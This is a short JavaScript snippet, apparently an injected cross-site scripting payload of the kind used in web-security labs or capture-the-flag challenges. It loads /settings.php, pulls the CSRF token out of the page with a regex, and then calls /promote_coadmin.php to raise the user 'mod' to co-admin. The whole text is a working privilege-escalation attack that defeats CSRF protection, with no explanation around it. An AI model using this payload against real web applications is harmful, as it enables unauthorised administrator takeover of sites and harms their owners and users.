fetch("/settings.php")
.then(r => r.text())
.then(d => {
    let token = d.match(/name="csrf_token_promote" value="([^"]+)"/)[1];
    fetch("/promote_coadmin.php?username=mod&csrf_token_promote=" + token);
});
